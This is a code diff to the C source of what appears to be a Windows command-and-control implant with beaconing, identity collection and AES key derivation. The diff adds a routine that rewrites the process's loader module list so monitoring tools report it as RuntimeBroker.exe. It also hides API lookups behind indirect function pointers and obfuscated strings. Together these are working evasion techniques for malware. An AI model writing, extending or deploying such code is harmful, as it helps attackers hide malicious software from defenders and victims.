@@ -73,7 +73,7 @@ static void PopulateIdentity(void) {
     DWORD hlen = HOSTNAME_MAX;
     typedef BOOL (WINAPI *pfnGetComputerNameExW)(COMPUTER_NAME_FORMAT, LPWSTR, LPDWORD);
     pfnGetComputerNameExW pFn = (pfnGetComputerNameExW)(FARPROC)
-        GetProcAddress(GetModuleHandleA(OBFSTR("kernel32.dll")), OBFSTR("GetComputerNameExW"));
+        g_GetProcAddress(g_GetModuleHandleA(OBFSTR("kernel32.dll")), OBFSTR("GetComputerNameExW"));
     if (pFn) pFn(ComputerNameDnsHostname, whost, &hlen);
     WstrToStr(whost, g_agent.hostname, HOSTNAME_MAX);
     if (!g_agent.hostname[0]) xsnprintf(g_agent.hostname, HOSTNAME_MAX, "unknown");
@@ -83,7 +83,7 @@ static void PopulateIdentity(void) {
     DWORD ulen = USERNAME_MAX;
     typedef BOOL (WINAPI *pfnGetUserNameW)(LPWSTR, LPDWORD);
     pfnGetUserNameW pUser = (pfnGetUserNameW)(FARPROC)
-        GetProcAddress(LoadLibraryA(OBFSTR("advapi32.dll")), OBFSTR("GetUserNameW"));
+        g_GetProcAddress(g_LoadLibraryA(OBFSTR("advapi32.dll")), OBFSTR("GetUserNameW"));
     if (pUser) pUser(wuser, &ulen);
     WstrToStr(wuser, g_agent.username, USERNAME_MAX);
     if (!g_agent.username[0]) xsnprintf(g_agent.username, USERNAME_MAX, "unknown");
@@ -138,6 +138,45 @@ static void PatchPEB(void) {
     }
 }
 
+/* ── LDR entry masquerade ────────────────────────────────────────────────── */
+/* Patch InLoadOrderModuleList entry for this process so tools that walk the
+ * LDR (Process Hacker, Get-Process -Module, etc.) see RuntimeBroker.exe. */
+static void PatchLDR(void) {
+    BYTE *peb      = (BYTE*)READ_GS_QWORD(0x60);
+    PVOID selfBase = *(PVOID*)(peb + 0x10);          /* PEB.ImageBaseAddress */
+    PVOID ldr      = *(PVOID*)(peb + PEB_OFFSET_LDR);
+    LIST_ENTRY *head = (LIST_ENTRY*)((BYTE*)ldr + LDR_OFFSET_INLOAD_LIST);
+
+    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
+        PVOID dllBase = *(PVOID*)((BYTE*)e + LDR_ENTRY_OFFSET_DLLBASE);
+        if (dllBase != selfBase) continue;
+
+        WCHAR fake_full[MAX_PATH];
+        WCHAR fake_base[32];
+        WOBFSTR("C:\\Windows\\System32\\RuntimeBroker.exe", fake_full, MAX_PATH);
+        WOBFSTR("RuntimeBroker.exe", fake_base, 32);
+
+        WCHAR *strs[2]    = { fake_full,              fake_base };
+        int    offsets[2] = { LDR_ENTRY_OFFSET_FULLNAME, LDR_ENTRY_OFFSET_BASENAME };
+
+        for (int i = 0; i < 2; i++) {
+            WCHAR *src = strs[i];
+            int nch = 0;
+            while (src[nch]) nch++;
+            SIZE_T nbytes = (SIZE_T)(nch + 1) * sizeof(WCHAR);
+            PVOID buf = NULL;
+            if (!NT_SUCCESS(NtAlloc((HANDLE)(LONG_PTR)-1, &buf, nbytes, PAGE_READWRITE)))
+                continue;
+            for (int j = 0; j <= nch; j++) ((WCHAR*)buf)[j] = src[j];
+            BYTE *us = (BYTE*)e + offsets[i];
+            *(USHORT*)(us + 0x00) = (USHORT)(nch * sizeof(WCHAR));
+            *(USHORT*)(us + 0x02) = (USHORT)((nch + 1) * sizeof(WCHAR));
+            *(WCHAR**)(us + 0x08) = (WCHAR*)buf;
+        }
+        break;
+    }
+}
+
 /* ── Derive AES key from CFG_ENC_KEY ─────────────────────────────────────── */
 
 static void DeriveKey(void) {
@@ -182,9 +221,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
     /* 5. WinHTTP */
     if (!BeaconInit()) ExitProcess(1);
 
-    /* 6. Identity + PEB masquerade */
+    /* 6. Identity + PEB/LDR masquerade */
     PopulateIdentity();
     PatchPEB();
+    PatchLDR();
     DeriveKey();
     GenerateAgentID();
 
